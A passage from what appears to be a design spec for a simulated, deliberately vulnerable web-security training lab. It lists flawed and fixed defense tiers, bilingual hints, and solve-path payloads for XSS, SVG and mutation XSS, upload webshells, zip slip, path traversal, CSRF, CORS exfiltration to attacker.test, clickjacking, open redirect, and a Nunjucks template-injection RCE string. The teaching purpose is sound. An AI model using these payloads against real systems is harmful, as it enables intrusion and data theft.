  unescaped, or autolinks a `data:text/html` image. **D** escape all raw HTML, allowlist link/image URL schemes
  (`http/https/mailto`), escape attributes.
- **Divine.** Escape-first renderer; URL-scheme allowlist; comment: Markdown is not a sanitizer.
- **Flag proof.** Render the note; victim "previews your shared note"; oracle `.executes` → flag.
- **Victim + rearm.** `sendLinkAction` (admin opens the shared note URL). `rearm: () => {}`.
- **Solve path.** A: raw `<script>hvwa('n')</script>`. T: `[x](javascript:hvwa('n'))`. I:
  `![x](x "onerror=hvwa('n')")` landing in an unescaped attribute, or `![x](data:text/html,…)`. D: resisted.
- **model.ts seams.** `renderMarkdown(level, src): string`; `markerFor`.
- **Pitfalls.** Keep the renderer small and *shown* (the flaw must be visible in View Source). Each level's flaw is
  a different Markdown feature (raw HTML / link scheme / attribute from title). Do not pull in a Markdown dep — the
  hand-rolled one is the lesson.
- **Hints.** 1) ID: "Markdown menjadi HTML — apa yang terjadi pada HTML yang sudah Anda tulis?" EN: "Markdown becomes
  HTML — what happens to HTML you already wrote?" 2) ID: "Tautan punya target; tidak semua skema target aman." EN:
  "Links have a target; not every target scheme is safe." 3) ID: "Judul atau sumber sebuah gambar bisa mendarat di
  dalam sebuah atribut." EN: "An image's title or source can land inside an attribute."

### SC-05 — SVG upload XSS · `svg-xss`
- **Goal.** Upload an SVG that scripts when the admin views it inline.
- **Page.** An avatar/sigil uploader; uploaded SVGs are shown inline (`<img>` for raster, inlined `<svg>` for
  vector) on a gallery the moderator reviews.
- **Levels.** **A** SVG stored and inlined raw (`<script>` in SVG runs). **T** strips `<script>` elements but keeps
  `<svg onload=…>` / `<a xlink:href="javascript:…">` / `<foreignObject>`. **I** serves the SVG but with
  `Content-Type: image/svg+xml` from a route that *also* allows it to be framed/inlined, blocking `onload` but not
  `<set attributeName=… onbegin>` / `<animate>` SMIL event or a namespaced handler. **D** rasterize-or-reject:
  reject inline SVG, serve uploads with `Content-Disposition: attachment` + `Content-Type: application/octet-stream`
  + `Content-Security-Policy: sandbox`.
- **Divine.** Never inline untrusted SVG; force download; CSP sandbox.
- **Flag proof.** Parse the stored SVG with the oracle (it handles the SVG namespace, `<script>`, `on*`, SMIL
  begin/end handlers, `<foreignObject>`); victim "reviews the gallery"; `.executes` → flag.
- **Victim + rearm.** `checkMailAction`-style "the moderator opens the sigil gallery". `rearm: () => {}`.
- **Solve path.** A: `<svg xmlns=…><script>hvwa('n')</script></svg>`. T: `<svg onload=hvwa('n')>`. I: SMIL
  `<set attributeName=x onbegin=hvwa('n')>` / `<animate onend>`. D: resisted (download, not inlined).
- **model.ts seams.** `storedSvg(req): Buffer`; `inlineFor(level, svg): string | null` (null = not inlined); upload
  via `parseMultipart`; `markerFor`.
- **Pitfalls.** Depends on **E2** (upload) and **E0** (oracle). Oracle must parse in the SVG/foreign-content mode
  (parse5 `parseFragment` with an `svg` context, or wrap in `<svg>` before parsing). Cap SVG at 64 KiB. Content-type
  of the serve route matters for the I-level distinction.
- **Hints.** 1) ID: "SVG bukan sekadar gambar; ia bisa berisi elemen aktif." EN: "An SVG is not just a picture; it
  can hold active elements." 2) ID: "Memblokir satu tag tidak memblokir setiap cara sebuah elemen bereaksi." EN:
  "Blocking one tag doesn't block every way an element reacts." 3) ID: "Bagaimana server menyajikan berkas
  menentukan apakah peramban menampilkannya sebaris." EN: "How the server serves the file decides whether the
  browser shows it inline."

### SC-06 — mXSS sanitizer bypass · `mxss` (levels A/I/D)
- **Goal.** Pass a sanitizer whose output, **re-parsed** by the browser, becomes script (mutation XSS).
- **Page.** A rich-comment box; input is sanitized then stored and rendered.
- **Levels.** **A** sanitizer allows a benign-looking construct that the browser re-parses into a sink (e.g.
  `<noscript>`/`<style>`/`<xmp>` boundary, or a `<math>/<svg>` foreign-content `<mglyph>/<mtext>` namespace
  confusion) — the serialize→reparse differential fires. **I** a stronger sanitizer closes the namespace trick but
  still normalizes an attribute whose re-serialized form breaks out (an unencoded `"` inside an allowed attribute
  after entity-decoding). **D** parse → allowlist → serialize → **re-parse and compare**; reject on any differential
  (mXSS-aware).
- **Divine.** Treat sanitized HTML as untrusted until a reparse fixed point is reached.
- **Flag proof.** `xssOracle(sanitizedHtml,marker)` reports `mxss:true` AND `executes:true` on the reparse → flag.
  (The oracle's serialize→reparse differential, measured working on parse5, is the detector.)
- **Victim + rearm.** `checkMailAction`-style "the moderator reads the comment". `rearm: () => {}`.
- **Solve path.** A: a `<noscript>`/foreign-content namespace payload that mutates on reparse. I: an
  entity/attribute-boundary mutation. D: resisted.
- **model.ts seams.** `sanitize(level, src): string`; the oracle's `reparse` exposed as a seam for the spec;
  `markerFor`.
- **Pitfalls.** Catalog gives **A I D** (no Templar) — keep it; mXSS has no meaningful "naive denylist" rung
  distinct from SC-02's. The sanitizer must be real enough that the mutation is the only bypass. This is the
  subtlest oracle case: the spec must pin known-good mutation corpora so a parse5 version bump that changes
  serialization is caught.
- **Hints.** 1) ID: "Pembersih melihat satu pohon HTML; peramban mungkin membangun pohon lain." EN: "The sanitizer
  sees one HTML tree; the browser may build a different one." 2) ID: "Beberapa konteks (SVG, MathML, noscript)
  mengubah aturan penguraian." EN: "Some contexts (SVG, MathML, noscript) change the parsing rules." 3) ID: "Keamanan
  hanya terbukti jika keluaran yang diurai ulang sama dengan yang disetujui." EN: "Safety holds only if the
  re-parsed output equals what was approved."

### SC-07 — Upload webshell (extension bypass) · `upload-webshell`
- **Goal.** Upload a file the server treats as executable and "run" it.
- **Page.** A document uploader ("submit a scroll for the archive"); uploaded files are listed and fetchable at
  `<lab>/uploads/<name>`.
- **Levels.** **A** any extension accepted; `.php`/`.ejs` fetched from `/uploads` is "interpreted". **T** a denylist
  of `.php`/`.phtml` (bypass: `.pHp`, `.php5`, `.phar`, trailing dot/space `shell.php.`). **I** an allowlist of
  `.jpg/.png` by extension, but the stored filename keeps the user's original and the serve route maps by
  **content-type sniff**, so `shell.php` sent as `image/jpeg` is stored then served executable; or the allowlist
  checks only the *last* extension while the interpreter runs on the *first*. **D** random server-assigned name, no
  user extension, served from a non-exec static route with a fixed `Content-Type`, never interpreted.
- **Divine.** Decouple stored name from served name; never execute uploads; fixed content-type.
- **Flag proof.** The simulated interpreter emits the session canary when it "runs" an uploaded file containing
  `<?hvwa CANARY ?>` from an executable path. Player fetches `<lab>/uploads/<name>` and reads the canary = flag.
- **Victim + rearm.** None (the player triggers it directly).
- **Solve path.** A: upload `shell.php` with `<?hvwa … ?>`, GET it. T: `shell.pHp5` / `shell.php.`. I: `shell.php`
  with `Content-Type: image/jpeg`, or `shell.jpg.php`. D: resisted.
- **model.ts seams.** `labFiles(req): SimFS`; `storeUpload(level, file)`; `serveUpload(level, name): {ct,body,executed}`;
  `canaryFor`.
- **Pitfalls.** Depends on **E2**. "Execution" is pattern-matching a marker — document loudly that no real
  interpreter runs. Distinguish SC-07 (extension filter) from SC-08 (double extension) cleanly: SC-07's I is
  content-type/last-vs-first-extension; SC-08 is specifically the double-extension + null/encoding trick.
- **Hints.** 1) ID: "Server memutuskan cara menyajikan berkas dari namanya — nama yang mana?" EN: "The server decides
  how to serve a file from its name — which name?" 2) ID: "Daftar blokir hanya menutup ejaan yang terpikir." EN: "A
  denylist only closes the spellings someone thought of." 3) ID: "Tipe yang Anda klaim dan ekstensi yang Anda tulis
  tidak harus cocok." EN: "The type you claim and the extension you write need not agree."

### SC-08 — Upload double-extension · `upload-double-ext`
- **Goal.** Bypass a filename check with a double (or encoded) extension.
- **Page.** Same uploader shape as SC-07, different filter lesson.
- **Levels.** **A** the server runs anything whose name *contains* `.php` (so `avatar.php.jpg` runs — Apache-style
  multi-extension). **T** it checks the final extension is `.jpg` but splits on the **last** dot while the exec
  mapping splits on the **first** (`shell.php.jpg`). **I** it rejects `.php` anywhere but decodes the name once, so
  `shell.php%00.jpg` / `shell.php%2ejpg` / a trailing-dot-after-decode slips. **D** server-assigned opaque name,
  single fixed extension, no decoding of user names.
- **Divine.** As SC-07 Divine; plus: never decode a filename into a path.
- **Flag proof.** Same simulated interpreter + canary as SC-07.
- **Victim + rearm.** None.
- **Solve path.** A: `x.php.jpg`. T: `shell.php.jpg`. I: `shell.php%00.jpg` / `shell%2ephp`. D: resisted.
- **model.ts seams.** `nameDecode(level, raw)`, `execExt(level, name)`, shared SimFS/interpreter with SC-07's
  `_shared`.
- **Pitfalls.** The null-byte/encoding case must be simulated (Node strips NUL in real paths, but here paths are sim
  FS keys, so the lab controls decoding). Keep step-up: A's "contains .php" is beaten by T's "last extension", which
  is beaten by I's "no decode".
- **Hints.** 1) ID: "Sebuah berkas bisa punya lebih dari satu ekstensi." EN: "A file can have more than one
  extension." 2) ID: "Titik pertama dan titik terakhir bisa berarti hal berbeda bagi kode yang berbeda." EN: "The
  first dot and the last dot can mean different things to different code." 3) ID: "Apa yang terjadi jika nama
  di-dekode satu kali sebelum diperiksa?" EN: "What if the name is decoded once before it's checked?"

### SC-09 — Upload polyglot image · `polyglot-image` (levels A/I/D)
- **Goal.** Upload a file that passes an image check yet carries an executable payload.
- **Page.** A profile-image uploader with a visible "we verify this is a real image" badge; images display inline.
- **Levels.** **A** content-type trusted; a `.gif`-typed file with script bytes passes and is inlined. **I** magic
  bytes + dimensions are parsed (`looksLikeImage`), but a GIF/JPEG polyglot whose header is valid *and* whose tail
  contains `<svg onload=…>`/`<?hvwa…?>` passes, and the serve route inlines or the interpreter reads the tail. **D**
  re-encode the image through a safe decoder (strip everything but pixels), serve as a fixed raster type, never
  inline untrusted markup.
- **Divine.** Transcode, don't validate; strip metadata.
- **Flag proof.** Two conjuncts: `looksLikeImage(bytes)===true` **and** (`xssOracle` finds a sink on inline, for the
  SVG-polyglot path) **or** (the simulated interpreter emits the canary, for the `<?hvwa?>`-tail path). Either way
  the canary reaches the player = flag.
- **Victim + rearm.** For the inline-SVG-polyglot variant, `checkMailAction`-style "the admin views the gallery";
  for the interpreter variant, none.
- **Solve path.** A: `image/gif`-typed script file. I: `GIF89a`-prefixed polyglot with a script tail. D: resisted.
- **model.ts seams.** `looksLikeImage(bytes)`, `inlineFor(level, bytes)`, interpreter, `canaryFor`.
- **Pitfalls.** Catalog gives **A I D** — keep it. Depends on **E2** (image sniff) and **E0** (oracle). The magic-
  byte sniff is hand-rolled (no dep). Teaches "valid header ≠ safe file".
- **Hints.** 1) ID: "Header yang benar membuktikan awal berkas, bukan keseluruhannya." EN: "A correct header proves
  the file's start, not the whole of it." 2) ID: "Satu berkas bisa menjadi gambar yang sah dan sesuatu yang lain
  sekaligus." EN: "One file can be a valid image and something else at once." 3) ID: "Mengubah sandi gambar menjadi
  piksel membuang segala sesuatu yang bukan piksel." EN: "Re-encoding an image to pixels discards everything that
  isn't pixels."

### SC-10 — ZIP slip · `zip-slip`
- **Goal.** A malicious archive writes outside the extraction directory.
- **Page.** A "restore your archive" uploader; the server extracts a `.zip` into the player's workspace and lists
  the results; a sentinel file (`templates/welcome.txt`) renders on the page.
- **Levels.** **A** entry names joined onto the target dir with no check → `../../templates/welcome.txt` overwrites
  the sentinel. **T** strips a leading `../` once (non-recursive) → `....//` / `..././` still escapes. **I**
  normalizes POSIX `../` but not backslash separators (`..\\..\\templates\\welcome.txt`) or an **absolute** entry
  name. **D** resolve each entry under the target and reject any whose resolved path escapes it (prefix check on the
  real-path), reject absolute/backslash names.
- **Divine.** Canonicalize + containment check per entry; reject on escape.
- **Flag proof.** The sentinel file's content is replaced by the archive entry's bytes; if the player's entry put
  `hvwa('CANARY')` there, the page (re-)renders the sentinel and shows the canary = flag. (State is `perSession`;
  the overwrite is the proof.)
- **Victim + rearm.** None.
- **Solve path.** A: zip with entry `../../templates/welcome.txt`. T: `....//....//templates/welcome.txt`. I:
  `..\\..\\templates\\welcome.txt`. D: resisted (entry listed as rejected).
- **model.ts seams.** `extract(level, zipBytes, targetDir): {written: string[], rejected: string[]}` over the sim
  FS; `sentinelPath`; `readZip(bytes)` (E2); `canaryFor`.
- **Pitfalls.** Depends on **E2** (zip reader + bomb guard). All paths are sim-FS keys (strings), never real paths,
  so Windows/POSIX separator handling is explicit and testable. The sentinel must be pinned so a rejected extraction
  leaves it unchanged (step-up at Divine).
- **Hints.** 1) ID: "Nama setiap berkas di dalam arsip bisa menunjuk ke mana saja." EN: "Each file's name inside the
  archive can point anywhere." 2) ID: "Menghapus satu `../` tidak menghapus yang tersembunyi di dalamnya." EN:
  "Removing one `../` doesn't remove the one hidden inside it." 3) ID: "Tidak semua sistem menulis pemisah jalur yang
  sama." EN: "Not every system writes the same path separator."

### SC-11 — Path traversal download · `path-traversal`
- **Goal.** Read a file outside the public scrolls directory.
- **Page.** A scroll library; each scroll has a "download" link `<lab>/download?file=<name>`; a secret
  `/vault/flag.txt` lives in the sim FS outside `/public`.
- **Levels.** **A** `read('/public/' + file)` with no check → `?file=../vault/flag.txt`. **T** strips `../`
  substrings once → `....//vault/flag.txt`. **I** rejects `../` but URL-decodes once after the check
  (`%2e%2e%2f`) or accepts a Windows separator / a leading `/` as absolute. **D** resolve under `/public`, reject
  anything escaping; serve by an allowlisted id, not a path.
- **Divine.** Map an id to a known file; never build a path from input.
- **Flag proof.** The response body is the requested sim-FS file; reading `/vault/flag.txt` returns the session
  canary = flag.
- **Victim + rearm.** None.
- **Solve path.** A: `?file=../vault/flag.txt`. T: `?file=....//vault/flag.txt`. I: `?file=%2e%2e%2fvault%2fflag.txt`
  or `?file=..\\vault\\flag.txt`. D: resisted (unknown id → uniform 404).
- **model.ts seams.** `resolve(level, file): string | null` (sim-FS key or reject); `vaultCanary`; shared SimFS.
- **Pitfalls.** Pure string handling over the sim FS — no real FS, so the Divine resolve is a map lookup, and the
  decode-after-check flaw is explicit. Keep distinct from SC-10 (write vs read). Uniform 404 at Divine (no
  file-exists oracle).
- **Hints.** 1) ID: "Tautan unduh membawa nama berkas; dari mana server membacanya?" EN: "The download link carries a
  filename; where does the server read it from?" 2) ID: "Memfilter lalu men-dekode bukanlah hal yang sama dengan
  men-dekode lalu memfilter." EN: "Filter-then-decode is not the same as decode-then-filter." 3) ID: "Cara teraman
  tidak pernah membangun jalur dari masukan sama sekali." EN: "The safest way never builds a path from input at all."

---

### FP-01 — CSRF change email (no token) · `csrf-email`
- **Goal.** From an attacker page, change the signed-in pilgrim's (admin's) email with no token.
- **Page.** A "forum account settings" page with a change-email form (`POST <lab>/account/email`); the admin is
  signed in. The player controls `pilgrim@citadel.test` (their own mailbox).
- **Levels.** **A** no CSRF token, no Origin/Referer check; a cross-site form POST is accepted. **T** checks the
  `Referer` header is present but not its value (missing → reject, any value → accept), and the attacker page can
  suppress Referer (`rel=noreferrer` / `Referrer-Policy: no-referrer`) *only* when it needs to be absent — so here
  the attacker simply sends one, or T checks Referer **contains** `citadel` (bypass: a path/query on attacker.test
  containing the string, or an open-redirect referer). **I** a per-session CSRF token exists but is validated only
  when the request is form-encoded; a `text/plain` body (simple request, no preflight) skips it. **D** double-submit
  or synchronizer token bound to the session + SameSite=Strict on the session cookie + Origin check.
- **Divine.** Token bound to session, checked always; SameSite=Strict; Origin allowlist.
- **Flag proof.** The forged request sets the admin's email to the player's mailbox; on success the citadel sends a
  "confirm your new address" notification carrying the session canary to that address → it appears in the player's
  **own inbox** panel = flag. Proves the write executed with the admin's cookies.
- **Victim + rearm.** `visitAttackerPageAction` (E1): the admin opens your attacker page, which auto-submits the
  forged POST. `rearm`: re-sign-in the admin (`browser.cookies.set(sessionCookie, adminSession)`), because the
  player's page could log the admin out.
- **Solve path.** A/T: auto-submitting form POST to `<lab>/account/email` with `email=pilgrim@citadel.test`. I:
  send it as `text/plain` to skip the token. D: resisted (token required, SameSite withholds the cookie).
- **model.ts seams.** `accountEmail(req)`, `applyEmailChange(level, state, req)` returning accepted/why; the sim's
  request context (site/method/contentType/Origin) passed in; `canaryFor`.
- **Pitfalls.** Depends on **E1** (SameSite jar + Origin + cross-site POST). The SameSite model is load-bearing: at
  A the lab's session cookie is set `SameSite=None` (or the lab omits SameSite and the sim default Lax would block a
  cross-site POST — so A must deliberately set `SameSite=None` to be exploitable, which is the realistic flaw). Make
  the cookie's SameSite a per-level decision shown in View Source.
- **Hints.** 1) ID: "Peramban korban mengirim cookie-nya ke setiap permintaan ke situs ini — termasuk dari halaman
  lain." EN: "The victim's browser sends its cookie to this site on every request — including from another page." 2)
  ID: "Apa yang membuktikan sebuah permintaan benar-benar berasal dari formulir situs ini?" EN: "What proves a
  request really came from this site's own form?" 3) ID: "Jenis konten sebuah permintaan bisa menentukan pemeriksaan
  mana yang berjalan." EN: "A request's content-type can decide which check runs."

### FP-02 — CSRF via JSON content-type · `csrf-json`
- **Goal.** Forge a state-changing JSON request cross-site.
- **Page.** A settings endpoint that accepts `application/json` (`POST <lab>/account/prefs`, body
  `{"notify":"…"}`), used by the forum's own fetch-based UI.
- **Levels.** **A** accepts any content-type and never checks Origin → a cross-site `fetch` with
  `Content-Type: application/json` is accepted (even though JSON normally forces a preflight, the lab's CORS lets the
  **simple** `text/plain`-smuggled JSON through; A models a server that parses the body as JSON regardless of
  content-type). **T** requires `Content-Type: application/json` believing it forces a preflight, but accepts a
  body sent as `text/plain` that it JSON-parses anyway. **I** checks a custom header `X-Requested-With` (which a
  simple cross-site request cannot set) but falls back to accepting the request if the header is absent. **D**
  require a CSRF token or a non-simple header **and** reject on its absence; Origin allowlist.
- **Divine.** No fail-open; token or enforced custom header; Origin check.
- **Flag proof.** As FP-01: the forged request flips a preference whose side effect notifies the player's mailbox
  with the canary, or sets a value the player then reads via their own account page.
- **Victim + rearm.** `visitAttackerPageAction` issuing `corsFetch`/`crossSitePost` with the chosen content-type and
  headers. `rearm`: re-sign-in the admin.
- **Solve path.** A/T: `fetch(url,{method:'POST',credentials:'include',body:JSON,headers:{'Content-Type':'text/plain'}})`.
  I: omit `X-Requested-With`. D: resisted.
- **model.ts seams.** `parsePrefs(level, req)`, the request context (content-type, Origin, headers) from E1;
  `canaryFor`.
- **Pitfalls.** Depends on **E1**. The content-type / simple-request / preflight model must be explicit in the sim:
  a cross-site `fetch` with a non-simple content-type or a custom header is marked "would require preflight"; the
  sim can model the attacker choosing a **simple** request (text/plain, no custom header) that skips preflight.
  Teaches why "it's JSON so it's safe" is false.
- **Hints.** 1) ID: "Tidak semua permintaan lintas situs memicu pemeriksaan pendahuluan dari peramban." EN: "Not every
  cross-site request triggers the browser's preflight check." 2) ID: "Sebuah badan JSON masih bisa dikirim dengan
  jenis konten yang 'sederhana'." EN: "A JSON body can still be sent with a 'simple' content-type." 3) ID: "Menerima
  permintaan saat sebuah header tidak ada adalah gagal-terbuka." EN: "Accepting the request when a header is absent is
  failing open."

### FP-03 — CORS reflect-origin misconfig · `cors-misconfig`
- **Goal.** Read the signed-in user's private data from an attacker origin via a credentialed cross-origin fetch.
- **Page.** A JSON API `GET <lab>/api/me` returning the pilgrim's profile (incl. a private canary) for the forum's
  own SPA.
- **Levels.** **A** reflects `Origin` into `Access-Control-Allow-Origin` and sets
  `Access-Control-Allow-Credentials: true` for any origin → any site reads it with credentials. **T** an allowlist
  check using `startsWith`/`includes` (`origin.endsWith('citadel.test')` matches `evil-citadel.test.attacker.test`
  or `citadel.test.attacker.test`). **I** a proper suffix check but it also allows `null` origin (sandboxed iframe /
  `data:`), or reflects origin only when it is not in a denylist (default-allow). **D** exact-match allowlist of
  trusted origins, credentials only for them, `Vary: Origin`, never reflect, never `*`-with-credentials.
- **Divine.** Exact allowlist; no reflection; `Vary: Origin`.
- **Flag proof.** The sim's `corsFetch` (E1) enforces the browser rule; when the level's ACAO/ACAC permit a
  **credentialed** read, the attacker JS reads the body and exfiltrates the canary to the attacker log = flag. When
  blocked, nothing is logged.
- **Victim + rearm.** `visitAttackerPageAction` running `corsFetch(url,{credentials:'include'})`. `rearm`:
  re-sign-in the admin.
- **Solve path.** A: fetch from `http://attacker.test`, read body. T: fetch from a host whose name matches the flawed
  substring check (`http://citadel.test.attacker.test`). I: `null` origin via a sandboxed iframe. D: resisted (read
  blocked by SOP; nothing logged).
- **model.ts seams.** `corsHeaders(level, origin): {acao?, acac?}`; the sim's CORS enforcement is the oracle;
  `canaryFor`.
- **Pitfalls.** Depends on **E1** (CORS eval). The flag only appears when the **read** is allowed, not merely when
  the request is sent — the sim must model SOP precisely (ACAO exact or `*`; `*` + credentials is NOT a valid read;
  ACAC true required for credentialed). Teaches that a reflected ACAO with credentials is total.
- **Hints.** 1) ID: "Siapa yang diizinkan membaca jawaban ini, dan siapa yang memutuskannya?" EN: "Who is allowed to
  read this response, and who decides that?" 2) ID: "Mencocokkan asal dengan 'mengandung' atau 'berakhir dengan'
  jarang aman." EN: "Matching an origin by 'contains' or 'ends with' is rarely safe." 3) ID: "Mengizinkan kredensial
  untuk asal yang dipantulkan memberikan semuanya." EN: "Allowing credentials for a reflected origin gives everything
  away."

### FP-04 — Clickjacking (no frame headers) · `clickjacking` (levels A/T/D)
- **Goal.** Frame a sensitive one-click action and trick the admin into clicking through an overlay.
- **Page.** A one-click sensitive action (`POST <lab>/moderation/grant`, "approve this moderator request"); the
  admin is signed in. The player's attacker page frames it under a decoy.
- **Levels.** **A** no framing headers at all → the page frames and the clickthrough submits. **T** sets
  `X-Frame-Options: SAMEORIGIN` but **only** on the top page, not on the action/confirm page that actually submits
  (or sets it via a `<meta>` tag, which browsers ignore). **D** `X-Frame-Options: DENY` +
  `Content-Security-Policy: frame-ancestors 'none'` on every sensitive route, and the action requires a same-page
  token so a bare framed click cannot submit.
- **Divine.** Deny framing everywhere; action needs an interaction token.
- **Flag proof.** The sim's `frame()` + `clickThrough()` (E1): if the page is framable, the clickthrough fires the
  same-site POST with the admin's cookies; the action "grants moderator to pilgrim" (the player). The player then
  loads their **own** profile and sees the flag because they are now a moderator = flag. Stays on the player's own
  session.
- **Victim + rearm.** `frameAndClickAction` (E1): the admin opens your framing page and clicks the overlay.
  `rearm`: re-sign-in the admin.
- **Solve path.** A: frame `<lab>/moderation/grant`, overlay a decoy button, clickthrough. T: frame the
  confirm/action page that lacks the header. D: resisted (frame blocked; token required).
- **model.ts seams.** `framingHeaders(level, route)`; `grant(level, state, req)`; `isModerator(state)`; the sim's
  frame eval; `canaryFor`.
- **Pitfalls.** Catalog gives **A T D** (no Inquisitor) — keep it; "real but flawed frame defense" (T: header on
  the wrong page / meta tag) is already the Inquisitor-grade flaw, so three rungs suffice. The clickthrough POST is
  **same-site** (citadel frame → citadel), so SameSite=Lax cookies ARE sent — contrast with FP-01/02 (cross-site).
  The sim must model framed same-site correctly.
- **Hints.** 1) ID: "Satu klik bisa cukup jika halamannya bisa dibingkai." EN: "One click can be enough if the page
  can be framed." 2) ID: "Lindungi setiap halaman yang bertindak, bukan hanya halaman depan." EN: "Protect every page
  that acts, not just the front page." 3) ID: "Sebuah tag `<meta>` tidak menghentikan pembingkaian; header respons
  yang melakukannya." EN: "A `<meta>` tag doesn't stop framing; a response header does."

### FP-05 — Stored XSS (bio) · `bio-xss`
- **Goal.** Store script in your profile bio that a visitor (admin) viewing your profile runs.
- **Page.** A profile editor (bio field) and a public profile page `<lab>/u/:name` that renders the bio.
- **Levels.** **A** bio rendered raw. **T** escapes `<`/`>` but renders the bio inside a `style="…"` or a
  `title`/`data-*` attribute built by string concat, breakable with a quote. **I** allows a small set of "formatting"
  tags (`<b> <i> <a>`) via a denylist-after-allowlist that keeps `<a href>` with a `javascript:` scheme or an
  `on*` on an allowed tag. **D** allowlist sanitizer (tags + attrs + URL scheme), re-serialized.
- **Divine.** Parse → allowlist → serialize.
- **Flag proof.** Bio persists (`perSession`); victim "views your profile"; oracle `.executes` → attacker-log canary
  = flag.
- **Victim + rearm.** `sendLinkAction` ("the admin opens the profile link you send") or a fixed "admin reviews new
  profiles" action. `rearm: () => {}`.
- **Solve path.** A: `<script>hvwa('n')</script>`. T: break the attribute with `"` + `onmouseover`. I:
  `<a href="javascript:hvwa('n')">x</a>` on a click twin, or `<b onpointerenter=…>`. D: resisted.
- **model.ts seams.** `bio(req)`, `renderBio(level, bio): string`, `markerFor`. `reset` allowed (no limiter).
- **Pitfalls.** Depends on **E0**. Distinct from SC-02 (review) by **context**: FP-05 teaches attribute-context and
  allowed-tag attribute injection; SC-02 teaches denylist and tag stripping. Keep the two labs' flaws non-
  overlapping.
- **Hints.** 1) ID: "Bio Anda ditampilkan di profil yang dilihat orang lain." EN: "Your bio shows on a profile others
  view." 2) ID: "Teks yang aman di satu tempat HTML bisa berbahaya di tempat lain." EN: "Text that's safe in one HTML
  place can be dangerous in another." 3) ID: "Mengizinkan beberapa tag tetap berarti memeriksa atributnya." EN:
  "Allowing a few tags still means checking their attributes."

### FP-06 — SSTI (Nunjucks) · `ssti`
- **Goal.** Inject template syntax that the server evaluates.
- **Page.** A "customize your welcome banner" feature: the user supplies a greeting template rendered with Nunjucks
  server-side; the rendered banner shows on their profile.
- **Levels.** **A** the user's string is concatenated into the template source and rendered
  (`renderString("Hi " + userInput)`) → `{{7*7}}` evaluates; a planted context var `secret` leaks via
  `{{secret}}`. **T** a denylist strips `{{`/`}}` (bypass: `{%…%}` tag syntax, or `{{` split). **I** it renders the
  user string as *data* (`render(tpl, {name:userInput})`) but one admin-only field (a "signature") is still
  concatenated into source; or it strips `{{` but allows `{%set%}`/`{%if%}`. **D** never compile user input;
  autoescape on; user strings only as data, never as template source.
- **Divine.** Separate code from data; no dynamic template compilation from input.
- **Flag proof.** `renderInSandbox` (E4) returns output; the planted context canary appears in the output only when
  injection evaluated → the player reads it on the banner = flag. (`{{7*7}}`→49 is the "it evaluates" tell; the
  canary is the flag.)
- **Victim + rearm.** None (the player renders their own banner).
- **Solve path.** A: `{{ secret }}` / `{{ 7*7 }}`. T: `{% set x = secret %}{{ x }}` / tag-syntax. I: inject via the
  concatenated field. D: resisted (shown as literal text).
- **model.ts seams.** `buildTemplate(level, userInput): {template, ctx}`; `renderInSandbox` via the fake transport in
  tests; `canaryFor` = the context `secret`.
- **Pitfalls.** Depends on **E4**. Nunjucks runs ONLY inside the sandbox. The flag is a sandbox-context var, not a
  host value. Keep FP-06 (leak a context var / evaluate expressions) distinct from FP-07 (reach "RCE").
- **Hints.** 1) ID: "Spanduk Anda adalah templat yang dirender server, bukan sekadar teks." EN: "Your banner is a
  server-rendered template, not just text." 2) ID: "Mesin templat punya sintaks selain kurung kurawal ganda." EN: "A
  template engine has syntax beyond double braces." 3) ID: "Perbedaan terbesar: masukan Anda adalah data, atau
  kode?" EN: "The key difference: is your input data, or code?"

### FP-07 — SSTI → RCE · `ssti-rce` (levels A/I/D)
- **Goal.** Escalate template injection to code execution and read a planted flag file.
- **Page.** Same banner feature; this lab exposes the full object graph (`range`/`cycler`/`constructor`) reachable
  from the template.
- **Levels.** **A** full `renderString` of user input with the object-graph escape reachable → classic
  `{{range.constructor("…")()}}` payload runs against the fake `child_process` and reads the planted flag. **I** a
  sandbox/denylist blocks `constructor`/`__proto__` substrings, but a different gadget (`cycler`/`joiner`/an exposed
  helper, or `{% set %}` with an allowed filter) reaches `Function`. **D** no dynamic compilation; locked context;
  no object-graph escape.
- **Divine.** As FP-06 Divine; plus a context with no escape primitives.
- **Flag proof.** `renderInSandbox` with the fake `shell(cmd)` that returns the session canary for
  `cat /srv/forum/flag` (or `process.env.FLAG`); `result.shellCalls` includes the command and the output carries the
  canary = flag. **Measured working** (A4). "RCE" = reading the planted flag in the WASM sandbox; nothing runs on
  the host.
- **Victim + rearm.** None.
- **Solve path.** A: `{{range.constructor("return process.mainModule.require('child_process').execSync('cat /srv/forum/flag')")()}}`.
  I: an alternative gadget avoiding the blocked substrings. D: resisted.
- **model.ts seams.** `buildTemplate(level, input)`; `shellFor(sessionId): (cmd)=>string`; the sandbox transport
  seam; `canaryFor`.
- **Pitfalls.** Catalog gives **A I D** — keep it (no "naive" rung between full escape and gadget-filter). Depends
  on **E4**. The fake shell must return a canary only for the planted path and a benign "not found" otherwise, so
  the proof is reading the planted flag, not arbitrary output. Deadline 250 ms; memory-capped (A4) so a payload loop
  cannot wedge the worker.
- **Hints.** 1) ID: "Evaluasi ekspresi membuka pintu ke objek di sekitarnya." EN: "Evaluating an expression opens a
  door to the objects around it." 2) ID: "Dari satu objek biasa, konstruktornya bisa membangun fungsi baru." EN:
  "From one ordinary object, its constructor can build a new function." 3) ID: "Jika satu jalan diblokir, objek
  bawaan templat lain mungkin menuju tempat yang sama." EN: "If one path is blocked, another of the template's
  built-in objects may lead to the same place."

### FP-08 — Open redirect (share link) · `open-redirect`
- **Goal.** Make the forum's share/continue link bounce to an attacker site.
- **Page.** A "share this thread" / post-login "continue" link: `<lab>/go?next=<url>` redirects to `next`.
- **Levels.** **A** `res`-style redirect to `next` verbatim (any URL). **T** requires `next` to start with `/`
  (bypass: `//attacker.test` protocol-relative, or `/\attacker.test`). **I** parses `next` and checks the host is
  `citadel.test` with `startsWith`/`includes` (bypass: `http://citadel.test.attacker.test`,
  `http://attacker.test/?x=citadel.test`, or a backslash-confused authority). **D** allow only a relative path
  under the lab (no scheme, no authority), or an exact-host allowlist.
- **Divine.** Relative-only or exact-host allowlist; reject anything with an authority.
- **Flag proof.** The redirect is answered via `sendSimRedirect` (existing): a citadel target lands in the lab; an
  attacker/other target renders the "your browser would go to …" page. The **victim** opens the share link you craft;
  if it leaves the lab to attacker.test, the sim logs the hit (the admin's browser arrived at your server) → the
  attacker-log hit (with the leaked path/Referer) = flag. (Mirrors GK-10's `sendSimRedirect` usage; `classifySimUrl`
  is ground truth, each level does its OWN flawed check.)
- **Victim + rearm.** `sendLinkAction` ("the admin opens the share link you send"). `rearm: () => {}`.
- **Solve path.** A: `?next=http://attacker.test/x`. T: `?next=//attacker.test/x` or `?next=/\attacker.test`. I:
